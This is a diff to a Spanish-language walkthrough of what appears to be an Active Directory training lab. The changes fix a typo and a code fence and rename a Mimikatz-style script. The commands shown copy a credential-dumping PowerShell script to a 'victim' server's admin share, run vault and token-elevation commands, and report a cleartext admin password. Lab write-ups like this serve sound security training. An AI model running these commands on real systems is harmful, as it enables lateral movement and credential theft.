@@ -280,9 +280,7 @@ Invoke-TheKat -Command $Pwn
 
 Ahora una vez el archivo modificado lo transferiremos a la maquina victima
 ```shell
-Copy-Item C:\AD\Tools\Invoke-```
-TheKatEx-keys
-```-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
 Una vez copiado en la maquina victima nos vamos al directorio donde lo hemos copiado en este caso *Program Files* y lo ejecutamos
@@ -300,9 +298,9 @@ Tendremos que modificar el archivo y añadir en la ultima linea
 Invoke-TheKat -Command '"token::evasive-elevate" "vault::cred /patch"'
 ```
 
-Lo volvemos a copiar en la maquina victima y lo ejejcutamos
+Lo volvemos a copiar en la maquina victima y lo ejecutamos
 ```shell
-Copy-Item C:\AD\Tools\Invoke-MimiEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
 Obteniendo como respuesta la contraseña en texto claro del usuario *srvadmin::TheKeyUs3ron@anyMachine!*
